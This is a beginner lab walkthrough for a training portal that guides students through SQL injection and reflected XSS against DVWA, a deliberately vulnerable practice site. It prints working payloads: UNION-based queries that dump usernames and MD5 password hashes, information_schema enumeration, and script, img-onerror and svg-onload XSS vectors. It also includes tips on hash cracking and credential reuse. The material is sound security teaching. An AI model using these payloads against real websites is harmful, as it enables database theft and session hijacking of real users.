## Scenario 2: SQL Injection & Reflected XSS

> **Path:** Browser-only via portal **Open DVWA**. Scoring is automatic from proxied DVWA responses, no Kali/sqlmap required for the primary scored path.

A guided, beginner walkthrough, done entirely in your **browser**. The portal watches DVWA and scores each milestone automatically, so there's no Kali, no sqlmap, and no copying cookies. Read each _“What you're doing & why”_ box as you go.

Medium 45–60 min · MITRE T1190 · Attacker (browser) · 4 milestones · 300 pts

## 0. Before you start: the big picture

You are the **attacker**, and your target is **DVWA** (Damn Vulnerable Web Application), a practice website built on purpose to be hackable. You'll prove the two most common web attacks, working entirely in your **browser** (no Kali, no command line):

- **SQL injection**, typing database commands into an ordinary input box (like a login or search field) to trick the site into handing back data it should keep private, such as usernames and password hashes.
- **Reflected XSS (Cross-Site Scripting)**, getting the site to run *your* JavaScript in the browser, the trick real attackers use to hijack another user's session.

Everything happens inside your own **isolated lab environment**, a private space only you can touch, so it's safe to break things here. You open the site with the **Open DVWA** button, log in, and the portal watches your attacks and scores each task automatically.

## 1. The pieces you'll use

### DVWA, the target website

**DVWA** ("Damn Vulnerable Web Application") is a website built _on purpose_ to be hackable. It has a security slider, this lab runs at **Low** , where the holes are wide open. You'll attack two of its pages: **SQL Injection** and **XSS (Reflected)**.

Task | Milestone | What you prove | Points  
--- | --- | --- | ---  
**Task 1** |  Injection Point | The ID field can be broken with SQL injection | 50  
**Task 2** |  Database Extraction | You can read the database name / structure | 75  
**Task 3** |  Admin Hash | You can dump the users table and its password hashes | 100  
**Task 4** |  Reflected XSS | You can make the site run your JavaScript | 75  
  
### How SQL injection works, in one picture

When you type an ID, DVWA drops it inside a database question, right between two single quotes:
```bash
SELECT first_name, last_name FROM users WHERE user_id = 'YOUR INPUT';
```

  * Type `1'` → it becomes `… = '1'';` → one extra quote nothing closes → **syntax error**. That error proves your text reached the query.
  * Type `1' OR '1'='1` → it becomes `… = '1' OR '1'='1';` → always true → returns **every user**.

The whole trick is the single quote Only a single quote can break this query, because the query is wrapped in single quotes. A double quote `"` does nothing here. 

## 2. How scoring works (read this)

The portal sits between you and DVWA. Every time you submit an attack, your request and DVWA's reply pass through the portal, and the portal looks at that reply for proof the attack worked. If it sees the proof, it records the milestone automatically.

So the result has to actually appear The portal scores what it _sees in DVWA's reply_. Make sure your payload really returns the rows / error / reflection described below, if nothing came back, nothing scores. If a milestone doesn't tick, re-check that **Security = Low** and submit again. 

## 3. Set up your lab

  1. Provision the **SQL Injection** lab from the portal and wait for the lab to go **ACTIVE**.
  2. Click **Open DVWA**, it opens the site in a new tab (session-gated; no VNC/desktop needed).
  3. Log in with `admin` / `password`. You should land on the DVWA menu (if you see _setup.php / Create Database_ , tell your instructor).
  4. Go to **DVWA Security** , set it to **Low** , and Submit.

## 4. Do the 4 milestones

For each one: open the module, paste the payload, submit, and watch the milestone tick. That's it.


### Task 1: prove the field is injectable

**Goal:** make the query misbehave.

> **What you're doing & why:** You slip a single quote into the ID field. Either you get a database error (proof your input reached the SQL) or you flip the logic to always-true and get every row back. The portal scores either outcome. 

#### Open SQL Injection → in the User ID box, submit **either one** of these (you only need one):

Option A, flip the logic to always-true so every row comes back:
```bash
1' OR '1'='1
```

Option B, just a lone quote to force a database error:
```bash
1'
```

**Done when:** several user rows appear (or a SQL syntax error shows) and **Injection Point** ticks.

What you can do with this You've proven the field trusts your input, that's the foothold everything else builds on. The same hole now lets you read the _whole_ database, not just user 1. The names you see (admin, Gordon Brown, …) are the app's user records; in the next tasks you'll pull the sensitive columns hiding behind them. 


### Task 2: read the database itself

**Goal:** make the database tell you its own name.

> **What you're doing & why:** **UNION** lets you bolt your own `SELECT` onto the query and show its output in the same table. Asking for `database()` makes DVWA print the current database name (`dvwa`) right in the results, proof you can read beyond the intended data. 

#### In the User ID box, submit:
```bash
1' UNION SELECT null, database() -- -
```

About `-- -` That's dash‑dash‑**space** ‑dash. It comments out DVWA's leftover `'` so the query stays valid. This module shows **two** columns, so every `UNION SELECT` must return exactly two values. Using `null, database()` puts the name **`dvwa` alone in the Surname cell**, which matches what beginners should look for (and what browser scoring checks).

Optional (playground): try `1' UNION SELECT user(), database() -- -` to also print the DB user in the First name cell, useful for learning, not required for this milestone.

**Done when:** a row shows the database name `dvwa` (Surname) and **Database Extraction** ticks.

What you can do with this Knowing the database name (`dvwa`) lets you aim at the right tables next. Use `information_schema` (see the playground) to list every table and column, the map you need before stealing the good stuff in Task 3. 


### Task 3: steal the password hashes

**Goal:** dump the `users` table so the admin's password hash appears.

> **What you're doing & why:** Same UNION trick, but now you read the `users` table directly, usernames and their (MD5) password hashes. Seeing a real 32‑character hash in the results is the proof for this milestone. 

#### In the User ID box, submit:
```bash
1' UNION SELECT user, password FROM users -- -
```

What you'll see Rows like `admin` → `5f4dcc3b5aa765d61d8327deb882cf99` (that hash is the word “password”). Drop a hash into a cracker like CrackStation to confirm. 

**Done when:** the results show user + 32‑character hash rows and **Admin Hash** ticks.

What you can do with this Those are MD5 password hashes, **crack them offline** with a wordlist tool (hashcat, John the Ripper) or a lookup site like CrackStation. The admin hash is just `MD5('password')`, so it falls instantly. Once cracked you could log in as `admin`; in the real world you'd also try that password on the target's other services (credential reuse). 


### Task 4: make the site run your script

**Goal:** get DVWA to reflect and run a `<script>`.

> **What you're doing & why:** The XSS (Reflected) page echoes your name straight back with no cleaning at Low security. Send it a `<script>` and the browser runs it, a pop-up appears. The portal sees your script reflected in the reply and scores it. 

#### Open XSS (Reflected) → in the “What's your name?” box, submit:
```bash
<script>alert(1)</script>
```

**Done when:** an `alert` pop-up appears (your script ran) and **Reflected XSS** ticks.

What you can do with this You can run _any_ JavaScript in whoever opens the page. In the real world an attacker wraps this in a link and sends it to a victim, opening it could steal their session cookie, log keystrokes, redirect them to a fake login, or act as them on the site. (Here the sandbox blocks cookie theft, try `<script>alert(document.cookie)</script>` in the playground and watch it come up empty.) 

**Scenario complete** when all 4 milestones pass and your total is **300 points** (50 + 75 + 100 + 75). 

---
## 5. Payload playground (explore, not required for scoring)

Once you've earned the four milestones, try these to actually _understand_ the two bugs. They're safe here, it's your isolated lab. Paste each into the matching DVWA field.

### SQL Injection, in the _User ID_ box

Payload | What it teaches / what you'll see  
--- | ---  
`1'` | Breaks the quote → SQL syntax error. The error text confirms injection.  
`1' AND '1'='1` vs `1' AND '1'='2` | **Boolean logic:** the first returns user 1, the second returns nothing, the page answers true/false to your condition.  
`1' ORDER BY 2 -- -` then `1' ORDER BY 3 -- -` | **Column counting:** 2 works, 3 errors → the query has **2 columns** (why UNION needs two values).  
`1' UNION SELECT null, null -- -` | Confirms UNION works and both columns are printable.  
`1' UNION SELECT user(), @@version -- -` | Reveals the **DB user** and the **MySQL/MariaDB version**.  
`1' UNION SELECT table_name, table_schema FROM information_schema.tables -- -` | Lists every **table** in the server (the database's blueprint).  
`1' UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name='users' -- -` | Lists the **columns** of the `users` table so you know what to steal.  
`1' UNION SELECT user, CONCAT(user,0x3a,password) FROM users -- -` | Dumps each account as `user:hash` in one field, ready to feed a password cracker. (`0x3a` is a colon.)  
  
### Reflected XSS, in the _“What's your name?”_ box

Payload | What it teaches / what you'll see  
--- | ---  
`<script>alert(1)</script>` | The classic proof, a pop-up means your script executed.  
`<script>alert(document.domain)</script>` | Shows _which site_ the script runs as, useful for judging impact.  
`<img src=x onerror=alert('XSS')>` | XSS **without** a `<script>` tag, a broken image fires the code. Handy when scripts are filtered.  
`<svg onload=alert(1)>` | Another script‑less vector, the SVG's load event runs your code.  
`<b>bold</b>` or `<marquee>hi</marquee>` | Harmless HTML injection, proves your markup is rendered, not escaped, before you reach for scripts.  
`<script>alert(document.cookie)</script>` | **Try it, and notice it fails / is empty.** The sandbox gives this page no real origin, so it _can't read the portal's cookies_. That's the isolation working: even a real XSS here can't hijack your session.  
  
Reflected vs stored XSS This is **reflected** XSS: the script only runs for whoever opens your crafted link, and isn't saved. **Stored** XSS (a different module) saves the payload on the server so it fires for every visitor, more dangerous. Both are fixed the same way: escape/encode output and validate input. 

---
## 6. Common problems & fixes

Problem | Fix  
--- | ---  
Milestone didn't tick | Make sure the result actually appeared (rows / error / pop-up), confirm **Security = Low** , then submit again.  
Only one row / no rows | Security isn't Low, or the payload has a typo. Re-check the quote and the `-- -` (dash‑dash‑space‑dash).  
UNION says “different number of columns” | This module has **2** columns, your `UNION SELECT` must return exactly two values (pad with `null`).  
XSS didn't pop | Security isn't Low (higher levels escape your input), or you're on the wrong module, use **XSS (Reflected)**.  
